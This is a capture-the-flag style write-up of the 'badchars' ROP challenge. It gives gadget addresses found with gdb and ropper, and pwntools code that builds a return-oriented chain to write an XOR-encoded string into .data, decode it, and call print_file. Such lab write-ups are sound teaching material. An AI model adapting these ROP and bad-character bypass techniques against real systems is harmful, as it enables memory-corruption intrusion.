Differences from 32 to 64

# XOR exploit
```
for x in xored_string:
    # Pop r14 with the next value
    xor_exploit += pack(pop_r14_pop_r15)
    # What to xor with
    xor_exploit += pack(value_to_xor_with)
    # Where the character is
    xor_exploit += pack(data_section_address + data_addr_offset)
    # xor r15 with r14b (r14[-4:])
    xor_exploit += pack(xor_r15_r14b)
    # +1 to go to the next byte
    data_addr_offset += 1
```

# Build the payload
```
payload = flat({
    offset: [pop_r12_pop_r13,   #Put in the next 4 arguments
    xored_string,               #First 4 bytes of the data
    data_section_address,       #Where I am putting data
    0x0,                        #Null to make it happy since it wants something in r14
    0x0,                        #Null to make it happy since it wants something in r15
    mov_r12_r13,                #Move esi (XOR data) to edi (Location to write)

    xor_exploit,                #Annoying and complex train to get clean string from xorred string
    
    pop_rdi,
    data_section_address,       #Where I have string
    print_file                  #Function to read something
    ]
})
```

# Where to start?
```
    Find out the bad characters
        Running program shows it along with ghidra on the .so file
    Find the offset
        Manual Fuzz with python -c "print 'B'*40" | ./badchars 
    Find print file
        gdb badchars
        disas usefulFunctions
            0x0000000000400620 <+9>:     call   0x400510 <print_file@plt>
    Find gadget to write something
        gdb badchars
        disas usefulGadgets or ropper -f badchar32 --search mov -b '6167782e'
            0x0000000000400634: mov qword ptr [r13], r12; ret;
            I now need something that pops r12 into r13
    Find a way to get info into r12 and r13
        ropper -f badchars --search pop -b '6167782e'
            0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret; 
    Find an xor that doesn't have bad characters
        def bad_chars(string, badchars)
    DeXOR file
        ropper -f badchars --search "xor" -b '6167782e'
            0x0000000000400628: xor byte ptr [r15], r14b; ret; 
    Need to pop things into ebp and bl (bl is the last 4 bytes of a 32 byte ebx)
            ropper -f badchars32 --search "pop ebp" -b '6167782e'
            0x00000000004006a0: pop r14; pop r15; ret;
    Need to have each character deXORed 
        for x in xored_string:
                # Pop r14 with the next value
            xor_exploit += pack(pop_r14_pop_r15)
                # What to xor with
            xor_exploit += pack(value_to_xor_with)
                # Where the character is
            xor_exploit += pack(data_section_address + data_addr_offset)
                # xor ebp with bl (ebx[-4:])
            xor_exploit += pack(xor_r15_r14b)
                # +1 to go to the next byte
            data_addr_offset += 1
```

# Attack Order
```
    pop_r12_pop_r13
    xored_string
    data_section_address
    0x0
    0x0
    mov_r12_r13

    xor_exploit
    
    pop_rdi
    data_section_address
    print_file
```

# How do you know what to do???
```
    data_section_address = 0x0000000000601030
        readelf -S badchars
            [Nr] Name      Type         Address             Offset        Size              EntSize           Flags  Link  Info  Align
            [23] .data     PROGBITS     0000000000601028    00001028      0000000000000010  0000000000000000  WA     0     0     8

            Addr is what I need
            Size is how much I can write
            **W flag means I can write to it**
            Need to write to the last 8 bytes so add 2 to address
    
    mov_r12_r13 = 0x0000000000400634
        gdb badchars
        disas usefulGadgets or ropper -f badchar32 --search mov -b '6167782e'
            0x0000000000400634: mov qword ptr [r13], r12; ret;
            I now need something that pops r12 into r13
    
    print_file = 0x0000000000400620
        gdb badchars
        disas usefulFunctions
            0x0000000000400620 <+9>:     call   0x400510 <print_file@plt>

    pop_r12_pop_r13 = 0x000000000040069c
        ropper -f badchars --search pop -b '6167782e'
            0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret; 
    
    pop_rdi = 0x0000000000400693
        ropper -f badchar --search pop
            0x0000000000400693: pop rdi; ret; 

    xor_r15_r14b: 0x0000000000400628
        ropper -f badchars --search "xor" -b '6167782e'
            0x0000000000400628: xor byte ptr [r15], r14b; ret; 

    pop_r14_pop_r15 = 0x00000000004006a0
        ropper -f badchars --search "pop" -b '6167782e'
            0x00000000004006a0: pop r14; pop r15; ret;
```    
# Manual Exploitation
XORing makes manual exploitation crafting impractical...
